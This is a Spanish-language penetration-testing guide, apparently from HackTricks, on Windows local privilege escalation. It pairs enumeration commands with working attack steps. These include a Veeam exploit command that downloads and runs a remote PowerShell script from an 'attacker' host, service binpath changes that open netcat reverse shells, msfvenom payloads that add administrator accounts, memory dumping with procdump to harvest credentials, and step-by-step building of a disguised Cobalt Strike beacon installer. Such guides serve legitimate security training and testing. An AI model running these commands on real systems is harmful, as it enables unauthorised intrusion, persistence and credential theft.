# Windows Local Privilege Escalation

{{#include ../../banners/hacktricks-training.md}}

### **Mejor herramienta para buscar vectores de Windows local privilege escalation:** [**WinPEAS**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/winPEAS)

## Teoría inicial de Windows

### Access Tokens

**Si no sabes qué son los Windows Access Tokens, lee la siguiente página antes de continuar:**


{{#ref}}
access-tokens.md
{{#endref}}

### ACLs - DACLs/SACLs/ACEs

**Consulta la siguiente página para más información sobre ACLs - DACLs/SACLs/ACEs:**


{{#ref}}
acls-dacls-sacls-aces.md
{{#endref}}

### Integrity Levels

**Si no sabes qué son los integrity levels en Windows, deberías leer la siguiente página antes de continuar:**


{{#ref}}
integrity-levels.md
{{#endref}}

## Windows Security Controls

Hay distintas cosas en Windows que podrían **impedirte enumerar el sistema**, ejecutar binarios o incluso **detectar tus actividades**. Deberías **leer** la siguiente **página** y **enumerar** todos estos **mecanismos de defensa** antes de empezar la enumeración de privilege escalation:


{{#ref}}
../authentication-credentials-uac-and-efs/
{{#endref}}

### Admin Protection / UIAccess silent elevation

Los procesos UIAccess lanzados a través de `RAiLaunchAdminProcess` pueden ser abusados para alcanzar High IL sin prompts cuando se eluden las comprobaciones de secure-path de AppInfo. Consulta aquí el flujo dedicado de bypass de UIAccess/Admin Protection:

{{#ref}}
uiaccess-admin-protection-bypass.md
{{#endref}}

La propagación del registro de accesibilidad de Secure Desktop puede ser abusada para una escritura arbitraria en el registro de SYSTEM (RegPwn):

{{#ref}}
secure-desktop-accessibility-registry-propagation-regpwn.md
{{#endref}}

Las versiones recientes de Windows también introdujeron una vía de LPE **SMB arbitrary-port** donde una autenticación NTLM local privilegiada se refleja sobre una conexión TCP SMB reutilizada:

{{#ref}}
local-ntlm-reflection-via-smb-arbitrary-port.md
{{#endref}}

## System Info

### Version info enumeration

Comprueba si la versión de Windows tiene alguna vulnerabilidad conocida (comprueba también los parches aplicados).
```bash
systeminfo
systeminfo | findstr /B /C:"OS Name" /C:"OS Version" #Get only that information
wmic qfe get Caption,Description,HotFixID,InstalledOn #Patches
wmic os get osarchitecture || echo %PROCESSOR_ARCHITECTURE% #Get system architecture
```

```bash
[System.Environment]::OSVersion.Version #Current OS version
Get-WmiObject -query 'select * from win32_quickfixengineering' | foreach {$_.hotfixid} #List all patches
Get-Hotfix -description "Security update" #List only "Security Update" patches
```
### Version Exploits

Este [site](https://msrc.microsoft.com/update-guide/vulnerability) es útil para buscar información detallada sobre vulnerabilidades de seguridad de Microsoft. Esta base de datos tiene más de 4,700 vulnerabilidades de seguridad, mostrando la **enorme superficie de ataque** que presenta un entorno Windows.

**En el sistema**

- _post/windows/gather/enum_patches_
- _post/multi/recon/local_exploit_suggester_
- [_watson_](https://github.com/rasta-mouse/Watson)
- [_winpeas_](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite) _(Winpeas tiene watson integrado)_

**Localmente con información del sistema**

- [https://github.com/AonCyberLabs/Windows-Exploit-Suggester](https://github.com/AonCyberLabs/Windows-Exploit-Suggester)
- [https://github.com/bitsadmin/wesng](https://github.com/bitsadmin/wesng)

**Repos de Github de exploits:**

- [https://github.com/nomi-sec/PoC-in-GitHub](https://github.com/nomi-sec/PoC-in-GitHub)
- [https://github.com/abatchy17/WindowsExploits](https://github.com/abatchy17/WindowsExploits)
- [https://github.com/SecWiki/windows-kernel-exploits](https://github.com/SecWiki/windows-kernel-exploits)

### Environment

¿Alguna credencial o información jugosa guardada en las variables de entorno?
```bash
set
dir env:
Get-ChildItem Env: | ft Key,Value -AutoSize
```
### Historial de PowerShell
```bash
ConsoleHost_history #Find the PATH where is saved

type %userprofile%\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt
type C:\Users\swissky\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt
type $env:APPDATA\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt
cat (Get-PSReadlineOption).HistorySavePath
cat (Get-PSReadlineOption).HistorySavePath | sls passw
```
### Archivos de transcripción de PowerShell

Puedes aprender cómo activar esto en [https://sid-500.com/2017/11/07/powershell-enabling-transcription-logging-by-using-group-policy/](https://sid-500.com/2017/11/07/powershell-enabling-transcription-logging-by-using-group-policy/)
```bash
#Check is enable in the registry
reg query HKCU\Software\Policies\Microsoft\Windows\PowerShell\Transcription
reg query HKLM\Software\Policies\Microsoft\Windows\PowerShell\Transcription
reg query HKCU\Wow6432Node\Software\Policies\Microsoft\Windows\PowerShell\Transcription
reg query HKLM\Wow6432Node\Software\Policies\Microsoft\Windows\PowerShell\Transcription
dir C:\Transcripts

#Start a Transcription session
Start-Transcript -Path "C:\transcripts\transcript0.txt" -NoClobber
Stop-Transcript
```
### PowerShell Module Logging

Los detalles de las ejecuciones del pipeline de PowerShell se registran, incluyendo los comandos ejecutados, las invocaciones de comandos y partes de scripts. Sin embargo, es posible que no se capturen los detalles completos de la ejecución ni los resultados de salida.

Para habilitarlo, sigue las instrucciones de la sección "Transcript files" de la documentación, eligiendo **"Module Logging"** en lugar de **"Powershell Transcription"**.
```bash
reg query HKCU\Software\Policies\Microsoft\Windows\PowerShell\ModuleLogging
reg query HKLM\Software\Policies\Microsoft\Windows\PowerShell\ModuleLogging
reg query HKCU\Wow6432Node\Software\Policies\Microsoft\Windows\PowerShell\ModuleLogging
reg query HKLM\Wow6432Node\Software\Policies\Microsoft\Windows\PowerShell\ModuleLogging
```
Para ver los últimos 15 eventos de los logs de PowersShell puedes ejecutar:
```bash
Get-WinEvent -LogName "windows Powershell" | select -First 15 | Out-GridView
```
### PowerShell **Script Block Logging**

Se captura un registro completo de la actividad y del contenido completo de la ejecución del script, garantizando que cada bloque de código se documente a medida que se ejecuta. Este proceso preserva una pista de auditoría integral de cada actividad, valiosa para forensics y para analizar comportamiento malicioso. Al documentar toda la actividad en el momento de la ejecución, se proporcionan detalles profundos sobre el proceso.
```bash
reg query HKCU\Software\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging
reg query HKLM\Software\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging
reg query HKCU\Wow6432Node\Software\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging
reg query HKLM\Wow6432Node\Software\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging
```
Los eventos de logging para el Script Block se pueden encontrar dentro de Windows Event Viewer en la ruta: **Application and Services Logs > Microsoft > Windows > PowerShell > Operational**.\
Para ver los últimos 20 eventos puedes usar:
```bash
Get-WinEvent -LogName "Microsoft-Windows-Powershell/Operational" | select -first 20 | Out-Gridview
```
### Configuración de Internet
```bash
reg query "HKCU\Software\Microsoft\Windows\CurrentVersion\Internet Settings"
reg query "HKLM\Software\Microsoft\Windows\CurrentVersion\Internet Settings"
```
### Drives
```bash
wmic logicaldisk get caption || fsutil fsinfo drives
wmic logicaldisk get caption,description,providername
Get-PSDrive | where {$_.Provider -like "Microsoft.PowerShell.Core\FileSystem"}| ft Name,Root
```
## WSUS

Puedes comprometer el sistema si las actualizaciones no se solicitan usando http**S** sino http.

Comienzas comprobando si la red usa una actualización WSUS sin SSL ejecutando lo siguiente en cmd:
```
reg query HKLM\Software\Policies\Microsoft\Windows\WindowsUpdate /v WUServer
```
O lo siguiente en PowerShell:
```
Get-ItemProperty -Path HKLM:\Software\Policies\Microsoft\Windows\WindowsUpdate -Name "WUServer"
```
Si recibes una respuesta como una de estas:
```bash
HKEY_LOCAL_MACHINE\Software\Policies\Microsoft\Windows\WindowsUpdate
WUServer    REG_SZ    http://xxxx-updxx.corp.internal.com:8535
```

```bash
WUServer     : http://xxxx-updxx.corp.internal.com:8530
PSPath       : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\software\policies\microsoft\windows\windowsupdate
PSParentPath : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\software\policies\microsoft\windows
PSChildName  : windowsupdate
PSDrive      : HKLM
PSProvider   : Microsoft.PowerShell.Core\Registry
```
Y si `HKLM\Software\Policies\Microsoft\Windows\WindowsUpdate\AU /v UseWUServer` o `Get-ItemProperty -Path hklm:\software\policies\microsoft\windows\windowsupdate\au -name "usewuserver"` es igual a `1`.

Entonces, **es explotable.** Si el último registry es igual a 0, entonces la entrada WSUS será ignorada.

Para explotar estas vulnerabilities puedes usar herramientas como: [Wsuxploit](https://github.com/pimps/wsuxploit), [pyWSUS ](https://github.com/GoSecure/pywsus)- Estos son scripts de exploits weaponized MiTM para inyectar 'fake' updates en tráfico WSUS no SSL.

Lee la investigación aquí:

{{#file}}
CTX_WSUSpect_White_Paper (1).pdf
{{#endfile}}

**WSUS CVE-2020-1013**

[**Lee el reporte completo aquí**](https://www.gosecure.net/blog/2020/09/08/wsus-attacks-part-2-cve-2020-1013-a-windows-10-local-privilege-escalation-1-day/).\
Básicamente, esta es la flaw que explota este bug:

> Si tenemos el poder de modificar nuestro local user proxy, y Windows Updates usa el proxy configurado en la configuración de Internet Explorer, por lo tanto tenemos el poder de ejecutar [PyWSUS](https://github.com/GoSecure/pywsus) localmente para interceptar nuestro propio tráfico y ejecutar code como un usuario elevado en nuestro asset.
>
> Además, como el servicio WSUS usa la configuración del usuario actual, también usará su certificate store. Si generamos un certificado self-signed para el hostname de WSUS y añadimos este certificado al certificate store del usuario actual, podremos interceptar tanto tráfico HTTP como HTTPS de WSUS. WSUS no usa mecanismos tipo HSTS para implementar una validación trust-on-first-use del certificado. Si el certificado presentado es trusted por el usuario y tiene el hostname correcto, será aceptado por el servicio.

Puedes explotar esta vulnerability usando la herramienta [**WSUSpicious**](https://github.com/GoSecure/wsuspicious) (una vez que esté liberated).

## Third-Party Auto-Updaters and Agent IPC (local privesc)

Muchos agentes enterprise exponen una superficie IPC localhost y un canal de actualización privilegiado. Si se puede coaccionar el enrollment hacia un servidor del atacante y el updater confía en una rogue root CA o en weak signer checks, un usuario local puede entregar un MSI malicioso que el servicio SYSTEM instala. Ver una técnica generalizada (basada en la cadena Netskope stAgentSvc – CVE-2025-0309) aquí:


{{#ref}}
abusing-auto-updaters-and-ipc.md
{{#endref}}

## Veeam Backup & Replication CVE-2023-27532 (SYSTEM via TCP 9401)

Veeam B&R < `11.0.1.1261` expone un servicio localhost en **TCP/9401** que procesa mensajes controlados por el atacante, permitiendo comandos arbitrarios como **NT AUTHORITY\SYSTEM**.

- **Recon**: confirma el listener y la versión, por ejemplo, `netstat -ano | findstr 9401` y `(Get-Item "C:\Program Files\Veeam\Backup and Replication\Backup\Veeam.Backup.Shell.exe").VersionInfo.FileVersion`.
- **Exploit**: coloca un PoC como `VeeamHax.exe` con las DLL de Veeam requeridas en el mismo directorio, luego dispara un payload SYSTEM sobre el socket local:
```powershell
.\VeeamHax.exe --cmd "powershell -ep bypass -c \"iex(iwr http://attacker/shell.ps1 -usebasicparsing)\""
```
El servicio ejecuta el comando como SYSTEM.
## KrbRelayUp

Existe una vulnerabilidad de **local privilege escalation** en entornos de Windows **domain** bajo condiciones específicas. Estas condiciones incluyen entornos donde no se aplica **LDAP signing**, los usuarios poseen self-rights que les permiten configurar **Resource-Based Constrained Delegation (RBCD)**, y la capacidad de los usuarios para crear computers dentro del domain. Es importante tener en cuenta que estos **requirements** se cumplen con los **default settings**.

Encuentra el **exploit in** [**https://github.com/Dec0ne/KrbRelayUp**](https://github.com/Dec0ne/KrbRelayUp)

Para más información sobre el flujo del ataque, consulta [https://research.nccgroup.com/2019/08/20/kerberos-resource-based-constrained-delegation-when-an-image-change-leads-to-a-privilege-escalation/](https://research.nccgroup.com/2019/08/20/kerberos-resource-based-constrained-delegation-when-an-image-change-leads-to-a-privilege-escalation/)

## AlwaysInstallElevated

**Si** estos 2 registers están **enabled** (valor **0x1**), entonces los usuarios de cualquier privilegio pueden **install** (execute) `*.msi` files como NT AUTHORITY\\**SYSTEM**.
```bash
reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
```
### Metasploit payloads
```bash
msfvenom -p windows/adduser USER=rottenadmin PASS=P@ssword123! -f msi-nouac -o alwe.msi #No uac format
msfvenom -p windows/adduser USER=rottenadmin PASS=P@ssword123! -f msi -o alwe.msi #Using the msiexec the uac wont be prompted
```
Si tienes una sesión de meterpreter, puedes automatizar esta técnica usando el módulo **`exploit/windows/local/always_install_elevated`**

### PowerUP

Usa el comando `Write-UserAddMSI` de power-up para crear dentro del directorio actual un binario MSI de Windows para escalar privilegios. Este script genera un instalador MSI precompilado que solicita la adición de un usuario/grupo (así que necesitarás acceso GIU):
```
Write-UserAddMSI
```
Just execute the created binary to escalate privileges.

### MSI Wrapper

Lee este tutorial para aprender cómo crear un wrapper MSI usando estas tools. Ten en cuenta que puedes envolver un archivo "**.bat**" si solo quieres **ejecutar** **command lines**


{{#ref}}
msi-wrapper.md
{{#endref}}

### Create MSI with WIX


{{#ref}}
create-msi-with-wix.md
{{#endref}}

### Create MSI with Visual Studio

- **Generate** con Cobalt Strike o Metasploit un **nuevo Windows EXE TCP payload** en `C:\privesc\beacon.exe`
- Abre **Visual Studio**, selecciona **Create a new project** y escribe "installer" en el cuadro de búsqueda. Selecciona el proyecto **Setup Wizard** y haz clic en **Next**.
- Dale al proyecto un nombre, como **AlwaysPrivesc**, usa **`C:\privesc`** como ubicación, selecciona **place solution and project in the same directory**, y haz clic en **Create**.
- Sigue haciendo clic en **Next** hasta llegar al paso 3 de 4 (choose files to include). Haz clic en **Add** y selecciona el Beacon payload que acabas de generar. Luego haz clic en **Finish**.
- Resalta el proyecto **AlwaysPrivesc** en **Solution Explorer** y en **Properties**, cambia **TargetPlatform** de **x86** a **x64**.
- Hay otras propiedades que puedes cambiar, como **Author** y **Manufacturer**, que pueden hacer que la app instalada parezca más legítima.
- Haz clic derecho en el proyecto y selecciona **View > Custom Actions**.
- Haz clic derecho en **Install** y selecciona **Add Custom Action**.
- Haz doble clic en **Application Folder**, selecciona tu archivo **beacon.exe** y haz clic en **OK**. Esto garantizará que el beacon payload se ejecute tan pronto como se ejecute el instalador.
- En **Custom Action Properties**, cambia **Run64Bit** a **True**.
- Finalmente, **build it**.
- Si aparece la advertencia `File 'beacon-tcp.exe' targeting 'x64' is not compatible with the project's target platform 'x86'`, asegúrate de establecer la plataforma en x64.

### MSI Installation

To execute the **installation** of the malicious `.msi` file in **background:**
```
msiexec /quiet /qn /i C:\Users\Steve.INFERNO\Downloads\alwe.msi
```
Para explotar esta vulnerabilidad puedes usar: _exploit/windows/local/always_install_elevated_

## Antivirus y Detectores

### Configuración de auditoría

Estas configuraciones deciden qué se está **registrando**, así que debes prestar atención
```
reg query HKLM\Software\Microsoft\Windows\CurrentVersion\Policies\System\Audit
```
### WEF

Windows Event Forwarding, es interesante saber a dónde se envían los logs
```bash
reg query HKLM\Software\Policies\Microsoft\Windows\EventLog\EventForwarding\SubscriptionManager
```
### LAPS

**LAPS** está diseñado para la **gestión de las contraseñas del Administrador local**, asegurando que cada contraseña sea **única, aleatoria y se actualice regularmente** en los equipos unidos a un dominio. Estas contraseñas se almacenan de forma segura dentro de Active Directory y solo pueden ser accedidas por usuarios a los que se les han concedido permisos suficientes mediante ACLs, permitiéndoles ver las contraseñas de admin local si están autorizados.


{{#ref}}
../active-directory-methodology/laps.md
{{#endref}}

### WDigest

Si está activo, **las contraseñas en texto plano se almacenan en LSASS** (Local Security Authority Subsystem Service).\
[**Más info sobre WDigest en esta página**](../stealing-credentials/credentials-protections.md#wdigest).
```bash
reg query 'HKLM\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest' /v UseLogonCredential
```
### Protección de LSA

A partir de **Windows 8.1**, Microsoft introdujo una protección mejorada para la Local Security Authority (LSA) para **bloquear** los intentos de procesos no confiables de **leer su memoria** o inyectar código, asegurando aún más el sistema.\
[**Más información sobre LSA Protection aquí**](../stealing-credentials/credentials-protections.md#lsa-protection).
```bash
reg query 'HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\LSA' /v RunAsPPL
```
### Credential Guard

**Credential Guard** fue introducido en **Windows 10**. Su propósito es proteger las credenciales almacenadas en un dispositivo contra amenazas como ataques pass-the-hash.| [**More info about Credentials Guard here.**](../stealing-credentials/credentials-protections.md#credential-guard)
```bash
reg query 'HKLM\System\CurrentControlSet\Control\LSA' /v LsaCfgFlags
```
### Credenciales en caché

Las **credenciales de dominio** son autenticadas por la **Local Security Authority** (LSA) y utilizadas por componentes del sistema operativo. Cuando los datos de inicio de sesión de un usuario son autenticados por un paquete de seguridad registrado, normalmente se establecen credenciales de dominio para el usuario.\
[**Más información sobre Cached Credentials aquí**](../stealing-credentials/credentials-protections.md#cached-credentials).
```bash
reg query "HKEY_LOCAL_MACHINE\SOFTWARE\MICROSOFT\WINDOWS NT\CURRENTVERSION\WINLOGON" /v CACHEDLOGONSCOUNT
```
## Usuarios y Grupos

### Enumerar Usuarios & Grupos

Deberías comprobar si alguno de los grupos a los que perteneces tiene permisos interesantes
```bash
# CMD
net users %username% #Me
net users #All local users
net localgroup #Groups
net localgroup Administrators #Who is inside Administrators group
whoami /all #Check the privileges

# PS
Get-WmiObject -Class Win32_UserAccount
Get-LocalUser | ft Name,Enabled,LastLogon
Get-ChildItem C:\Users -Force | select Name
Get-LocalGroupMember Administrators | ft Name, PrincipalSource
```
### Grupos privilegiados

Si **perteneces a algún grupo privilegiado, puede que puedas escalar privilegios**. Aprende sobre los grupos privilegiados y cómo abusar de ellos para escalar privilegios aquí:


{{#ref}}
../active-directory-methodology/privileged-groups-and-token-privileges.md
{{#endref}}

### Manipulación de tokens

**Aprende más** sobre qué es un **token** en esta página: [**Windows Tokens**](../authentication-credentials-uac-and-efs/index.html#access-tokens).\
Consulta la siguiente página para **aprender sobre tokens interesantes** y cómo abusar de ellos:


{{#ref}}
privilege-escalation-abusing-tokens.md
{{#endref}}

### Usuarios conectados / Sesiones
```bash
qwinsta
klist sessions
```
### Carpetas de inicio
```bash
dir C:\Users
Get-ChildItem C:\Users
```
### Política de contraseñas
```bash
net accounts
```
### Obtener el contenido del clipboard
```bash
powershell -command "Get-Clipboard"
```
## Procesos en ejecución

### Permisos de archivos y carpetas

Antes que nada, al listar los procesos **comprueba si hay contraseñas dentro de la línea de comandos del proceso**.\
Verifica si puedes **sobrescribir algún binario en ejecución** o si tienes permisos de escritura en la carpeta del binario para explotar posibles [**ataques de DLL Hijacking**](dll-hijacking/index.html):
```bash
Tasklist /SVC #List processes running and services
tasklist /v /fi "username eq system" #Filter "system" processes

#With allowed Usernames
Get-WmiObject -Query "Select * from Win32_Process" | where {$_.Name -notlike "svchost*"} | Select Name, Handle, @{Label="Owner";Expression={$_.GetOwner().User}} | ft -AutoSize

#Without usernames
Get-Process | where {$_.ProcessName -notlike "svchost*"} | ft ProcessName, Id
```
Siempre comprueba si hay posibles [**electron/cef/chromium debuggers** en ejecución, podrías abusar de ello para escalar privilegios](../../linux-hardening/privilege-escalation/electron-cef-chromium-debugger-abuse.md).

**Comprobando permisos de los binarios de los procesos**
```bash
for /f "tokens=2 delims='='" %%x in ('wmic process list full^|find /i "executablepath"^|find /i /v "system32"^|find ":"') do (
for /f eol^=^"^ delims^=^" %%z in ('echo %%x') do (
icacls "%%z"
2>nul | findstr /i "(F) (M) (W) :\\" | findstr /i ":\\ everyone authenticated users todos %username%" && echo.
)
)
```
**Comprobando los permisos de las carpetas de los binarios de los procesos (**[**DLL Hijacking**](dll-hijacking/index.html)**)**
```bash
for /f "tokens=2 delims='='" %%x in ('wmic process list full^|find /i "executablepath"^|find /i /v
"system32"^|find ":"') do for /f eol^=^"^ delims^=^" %%y in ('echo %%x') do (
icacls "%%~dpy\" 2>nul | findstr /i "(F) (M) (W) :\\" | findstr /i ":\\ everyone authenticated users
todos %username%" && echo.
)
```
### Memory Password mining

Puedes crear un volcado de memoria de un proceso en ejecución usando **procdump** de sysinternals. Servicios como FTP tienen las **credenciales en texto claro en memoria**, intenta volcar la memoria y leer las credenciales.
```bash
procdump.exe -accepteula -ma <proc_name_tasklist>
```
### Aplicaciones GUI inseguras

**Las aplicaciones que se ejecutan como SYSTEM pueden permitir a un usuario abrir un CMD o explorar directorios.**

Ejemplo: "Windows Help and Support" (Windows + F1), busca "command prompt", haz clic en "Click to open Command Prompt"

## Servicios

Service Triggers permiten a Windows iniciar un servicio cuando ocurren ciertas condiciones (actividad de named pipe/RPC endpoint, eventos ETW, disponibilidad de IP, llegada de un dispositivo, actualización de GPO, etc.). Incluso sin derechos SERVICE_START, a menudo puedes iniciar servicios privilegiados activando sus triggers. Ver técnicas de enumeración y activación aquí:

-
{{#ref}}
service-triggers.md
{{#endref}}

Obtén una lista de servicios:
```bash
net start
wmic service list brief
sc query
Get-Service
```
### Permisos

Puedes usar **sc** para obtener información de un servicio
```bash
sc qc <service_name>
```
Se recomienda tener el binario **accesschk** de _Sysinternals_ para comprobar el nivel de privilegio requerido para cada servicio.
```bash
accesschk.exe -ucqv <Service_Name> #Check rights for different groups
```
Se recomienda comprobar si "Authenticated Users" puede modificar algún servicio:
```bash
accesschk.exe -uwcqv "Authenticated Users" * /accepteula
accesschk.exe -uwcqv %USERNAME% * /accepteula
accesschk.exe -uwcqv "BUILTIN\Users" * /accepteula 2>nul
accesschk.exe -uwcqv "Todos" * /accepteula ::Spanish version
```
[You can download accesschk.exe for XP for here](https://github.com/ankh2054/windows-pentest/raw/master/Privelege/accesschk-2003-xp.exe)

### Habilitar servicio

Si estás teniendo este error (por ejemplo con SSDPSRV):

_System error 1058 has occurred._\
_The service cannot be started, either because it is disabled or because it has no enabled devices associated with it._

Puedes habilitarlo usando
```bash
sc config SSDPSRV start= demand
sc config SSDPSRV obj= ".\LocalSystem" password= ""
```
**Tenga en cuenta que el servicio upnphost depende de SSDPSRV para funcionar (para XP SP1)**

**Otra solución temporal** a este problema es ejecutar:
```
sc.exe config usosvc start= auto
```
### **Modificar la ruta del binario del servicio**

En el escenario donde el grupo "Authenticated users" posee **SERVICE_ALL_ACCESS** sobre un servicio, es posible modificar el binario ejecutable del servicio. Para modificar y ejecutar **sc**:
```bash
sc config <Service_Name> binpath= "C:\nc.exe -nv 127.0.0.1 9988 -e C:\WINDOWS\System32\cmd.exe"
sc config <Service_Name> binpath= "net localgroup administrators username /add"
sc config <Service_Name> binpath= "cmd \c C:\Users\nc.exe 10.10.10.10 4444 -e cmd.exe"

sc config SSDPSRV binpath= "C:\Documents and Settings\PEPE\meter443.exe"
```
### Reiniciar service
```bash
wmic service NAMEOFSERVICE call startservice
net stop [service name] && net start [service name]
```
Los privilegios pueden ser escalados mediante varios permisos:

- **SERVICE_CHANGE_CONFIG**: Permite reconfigurar el binary del servicio.
- **WRITE_DAC**: Habilita la reconfiguración de permisos, lo que lleva a la capacidad de cambiar las configuraciones del servicio.
- **WRITE_OWNER**: Permite adquirir la propiedad y reconfigurar permisos.
- **GENERIC_WRITE**: Hereda la capacidad de cambiar las configuraciones del servicio.
- **GENERIC_ALL**: También hereda la capacidad de cambiar las configuraciones del servicio.

Para la detección y explotación de esta vulnerabilidad, se puede utilizar el _exploit/windows/local/service_permissions_.

### Services binaries weak permissions

**Comprueba si puedes modificar el binary que ejecuta un servicio** o si tienes **permisos de escritura en la carpeta** donde se encuentra el binary ([**DLL Hijacking**](dll-hijacking/index.html))**.**\
Puedes obtener cada binary que ejecuta un servicio usando **wmic** (no en system32) y comprobar tus permisos usando **icacls**:
```bash
for /f "tokens=2 delims='='" %a in ('wmic service list full^|find /i "pathname"^|find /i /v "system32"') do @echo %a >> %temp%\perm.txt

for /f eol^=^"^ delims^=^" %a in (%temp%\perm.txt) do cmd.exe /c icacls "%a" 2>nul | findstr "(M) (F) :\"
```
También puedes usar **sc** y **icacls**:
```bash
sc query state= all | findstr "SERVICE_NAME:" >> C:\Temp\Servicenames.txt
FOR /F "tokens=2 delims= " %i in (C:\Temp\Servicenames.txt) DO @echo %i >> C:\Temp\services.txt
FOR /F %i in (C:\Temp\services.txt) DO @sc qc %i | findstr "BINARY_PATH_NAME" >> C:\Temp\path.txt
```
### Permisos para modificar el registro de servicios

Deberías comprobar si puedes modificar algún registro de servicio.\
Puedes **comprobar** tus **permisos** sobre un **registro** de servicio haciendo:
```bash
reg query hklm\System\CurrentControlSet\Services /s /v imagepath #Get the binary paths of the services

#Try to write every service with its current content (to check if you have write permissions)
for /f %a in ('reg query hklm\system\currentcontrolset\services') do del %temp%\reg.hiv 2>nul & reg save %a %temp%\reg.hiv 2>nul && reg restore %a %temp%\reg.hiv 2>nul && echo You can modify %a

get-acl HKLM:\System\CurrentControlSet\services\* | Format-List * | findstr /i "<Username> Users Path Everyone"
```
Debe comprobarse si **Authenticated Users** o **NT AUTHORITY\INTERACTIVE** poseen permisos `FullControl`. Si es así, se puede alterar el binario ejecutado por el servicio.

Para cambiar el Path del binario ejecutado:
```bash
reg add HKLM\SYSTEM\CurrentControlSet\services\<service_name> /v ImagePath /t REG_EXPAND_SZ /d C:\path\new\binary /f
```
### Carreras de symlink en el registro para escritura arbitraria de un valor HKLM (ATConfig)

Algunas funciones de Accesibilidad de Windows crean claves **ATConfig** por usuario que luego son copiadas por un proceso **SYSTEM** a una clave de sesión en HKLM. Una **carrera de symbolic link** en el registro puede redirigir esa escritura privilegiada a **cualquier ruta HKLM**, dando un primitive de **escritura arbitraria de valor HKLM**.

Ubicaciones clave (ejemplo: On-Screen Keyboard `osk`):

- `HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Accessibility\ATs` lista las funciones de accesibilidad instaladas.
- `HKCU\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Accessibility\ATConfig\<feature>` almacena configuración controlada por el usuario.
- `HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Accessibility\Session<session id>\ATConfig\<feature>` se crea durante las transiciones de logon/secure-desktop y puede ser escrita por el usuario.

Flujo de abuso (CVE-2026-24291 / ATConfig):

1. Rellena el valor **HKCU ATConfig** que quieres que SYSTEM escriba.
2. Dispara la copia a secure-desktop (por ejemplo, **LockWorkstation**), lo que inicia el flujo del broker de AT.
3. **Gana la carrera** colocando un **oplock** en `C:\Program Files\Common Files\microsoft shared\ink\fsdefinitions\oskmenu.xml`; cuando salte el oplock, reemplaza la clave **HKLM Session ATConfig** por un **registry link** a un destino HKLM protegido.
4. SYSTEM escribe el valor elegido por el atacante en la ruta HKLM redirigida.

Una vez que tienes escritura arbitraria de un valor HKLM, haz pivot a LPE sobrescribiendo valores de configuración de servicios:

- `HKLM\SYSTEM\CurrentControlSet\Services\<svc>\ImagePath` (EXE/command line)
- `HKLM\SYSTEM\CurrentControlSet\Services\<svc>\Parameters\ServiceDll` (DLL)

Elige un servicio que un usuario normal pueda iniciar (por ejemplo, **`msiserver`**) y actívalo después de la escritura. **Nota:** la implementación pública del exploit **bloquea la workstation** como parte de la carrera.

Ejemplo de tooling (RegPwn BOF / standalone):
```bash
beacon> regpwn C:\payload.exe SYSTEM\CurrentControlSet\Services\msiserver ImagePath
beacon> regpwn C:\evil.dll SYSTEM\CurrentControlSet\Services\SomeService\Parameters ServiceDll
net start msiserver
```
### Permisos AppendData/AddSubdirectory en el registro de servicios

Si tienes este permiso sobre un registro, esto significa que **puedes crear subregistros a partir de este**. En el caso de los servicios de Windows, esto es **suficiente para ejecutar código arbitrario:**


{{#ref}}
appenddata-addsubdirectory-permission-over-service-registry.md
{{#endref}}

### Unquoted Service Paths

Si la ruta a un ejecutable no está entre comillas, Windows intentará ejecutar cada final antes de un espacio.

Por ejemplo, para la ruta _C:\Program Files\Some Folder\Service.exe_ Windows intentará ejecutar:
```bash
C:\Program.exe
C:\Program Files\Some.exe
C:\Program Files\Some Folder\Service.exe
```
Listar todas las unquoted service paths, excluyendo las que pertenecen a servicios integrados de Windows:
```bash
wmic service get name,pathname,displayname,startmode | findstr /i auto | findstr /i /v "C:\Windows" | findstr /i /v '\"'
wmic service get name,displayname,pathname,startmode | findstr /i /v "C:\Windows\system32" | findstr /i /v '\"'  # Not only auto services

# Using PowerUp.ps1
Get-ServiceUnquoted -Verbose
```

```bash
for /f "tokens=2" %%n in ('sc query state^= all^| findstr SERVICE_NAME') do (
for /f "delims=: tokens=1*" %%r in ('sc qc "%%~n" ^| findstr BINARY_PATH_NAME ^| findstr /i /v /l /c:"c:\windows\system32" ^| findstr /v /c:"\""') do (
echo %%~s | findstr /r /c:"[a-Z][ ][a-Z]" >nul 2>&1 && (echo %%n && echo %%~s && icacls %%s | findstr /i "(F) (M) (W) :\" | findstr /i ":\\ everyone authenticated users todos %username%") && echo.
)
)
```

```bash
gwmi -class Win32_Service -Property Name, DisplayName, PathName, StartMode | Where {$_.StartMode -eq "Auto" -and $_.PathName -notlike "C:\Windows*" -and $_.PathName -notlike '"*'} | select PathName,DisplayName,Name
```
**Puedes detectar y explotar** esta vulnerabilidad con metasploit: `exploit/windows/local/trusted\_service\_path` Puedes crear manualmente un binary de servicio con metasploit:
```bash
msfvenom -p windows/exec CMD="net localgroup administrators username /add" -f exe-service -o service.exe
```
### Acciones de recuperación

Windows permite a los usuarios especificar acciones que se llevarán a cabo si un servicio falla. Esta funcionalidad puede configurarse para apuntar a un binario. Si este binario es reemplazable, podría ser posible una privilege escalation. Se pueden encontrar más detalles en la [official documentation](<https://docs.microsoft.com/en-us/previous-versions/windows/it-pro/windows-server-2008-R2-and-2008/cc753662(v=ws.11)?redirectedfrom=MSDN>).

## Aplicaciones

### Aplicaciones instaladas

Comprueba los **permisos de los binarios** (quizá puedas sobrescribir uno y escalar privilegios) y de las **carpetas** ([DLL Hijacking](dll-hijacking/index.html)).
```bash
dir /a "C:\Program Files"
